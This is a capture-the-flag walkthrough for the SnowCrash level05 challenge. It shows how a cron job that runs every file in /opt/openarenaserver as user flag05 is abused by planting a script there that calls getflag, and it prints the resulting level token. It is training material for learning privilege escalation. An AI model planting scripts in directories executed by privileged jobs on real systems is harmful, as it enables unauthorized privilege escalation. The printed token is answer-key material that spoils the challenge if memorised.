# SnowCrash Level05 Guide
This guide will walk you through the process of finding the password for the `flag05` user.

## Procedure:

1. **Examine your environment using Unix commands.**
   
`id` : Shows user and group identities that you have. 
```bash
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/level05
```
`ls -la` : Lists files and their permissions in the current directory.
Nothing interesting here.

2. **Check the files belonging to the user flag05**

We are looking at files belonging to the user flag05
```bash
find / -user flag05 2>/dev/null
```
Returns
```bash
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```     
`/rofs` indicates that the file is read-only.

3. **Analyse the script '/usr/sbin/openarenaserver'**

We look at what the file '/usr/sbin/openarenaserver' contains
```bash
cat /usr/sbin/openarenaserver
```
Returns
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Breaking down the script:
- It loops over all the files in the '/opt/openarenaserver' directory
- Executes the file with bash, with a runtime limited to 5 seconds (ulimit -t 5)
- Deletes the file

4. **Check '/opt/openarenaserver' directory**
We look at the files in the '/opt/openarenaserver' directory
```bash
ls -la /opt/openarenaserver
```
The directory is empty.
We now look for where the script '/usr/sbin/openarenaserver' is executed to execute our own script.

5. **Check the files belonging to the group level05**

We look at the files belonging to the group level05
```bash
find / -group level05 2>/dev/null
```
This returns many files.

6. **Check the files named 'level05'**

We modify the command to see if 'level05' files exist.
```bash
find / -name "level05" 2>/dev/null
```
Returns
```bash
/var/mail/level05
/rofs/var/mail/level05
```

7. **Check '/var/mail/level05' file**

We look at the contents of the file '/var/mail/level05'
```bash
cat /var/mail/level05
```
Returns
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
It's a cron task that executes the script '/usr/sbin/openarenaserver' every 2 minutes.
A cron task is composed of 6 fields:
- minute (0-59)
- hour (0-23)
- day of the month (1-31)
- month (1-12)
- day of the week (0-7, 0 and 7 are Sunday)
- command to execute
Here the command is 'su -c "sh /usr/sbin/openarenaserver" - flag05'.
- su: command to switch users
- -c: option to pass a command to the user
- "sh /usr/sbin/openarenaserver": command to execute
- -: option to pass the command to the user
- flag05: user to pass the command to
Every 2 minutes, all the files in the '/opt/openarenaserver' directory are executed with the rights of the user flag05, and then deleted.

8. **Check if the cron task is active**

We now check if the cron task is active.
To do this, we will create a script in the '/opt/openarenaserver' directory.
If the cron task is active, then this script should be executed and then deleted.
We create the script '/opt/openarenaserver/test.sh'
```bash
nano /opt/openarenaserver/test.sh
```
Insert
```bash
#!/bin/sh
echo "Test" >> /tmp/test
```
This script adds 'Test' to the file '/tmp/test', creating it if it does not exist.
We give execution rights to the script.
```bash
chmod +x /opt/openarenaserver/test.sh
```
We check if the script has been created correctly.
```bash
ls -la /opt/openarenaserver
```
Returns
```bash
-rwxrwxr-x+ 1 level05 level05 37 XXX test.sh
```
We wait 2 minutes to see if the script is executed.
We check if the script still exists.
```bash
ls -la /opt/openarenaserver
```
The script has been deleted.
We check if the file '/tmp/test' has been created.
```bash
cat /tmp/test
```
Returns
```bash
Test
```
The file has been successfully created.
The cron task is active.

9. **Exploit the cron task**

We will now create a script that executes getflag.
We retrieve the absolute path of the getflag command.
```bash
which getflag
```
Returns
```bash
/bin/getflag
```
Then we create the script '/opt/openarenaserver/test.sh' that executes getflag.
```bash
nano /opt/openarenaserver/test.sh
```
Insert
```bash
#!/bin/sh
/bin/getflag >> /tmp/flag
```
We give execution rights to the script
```bash
chmod +x /opt/openarenaserver/test.sh
```
We check if the script has been created correctly
```bash
ls -la /opt/openarenaserver
```
Then we wait for the script to be executed.
Once the script is executed, we look at the contents of the file '/tmp/flag'
```bash
cat /tmp/flag
```
Returns
```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Congratulations! We have succeeded in obtaining the token!
We now access level 06.
```bash
su level06
```
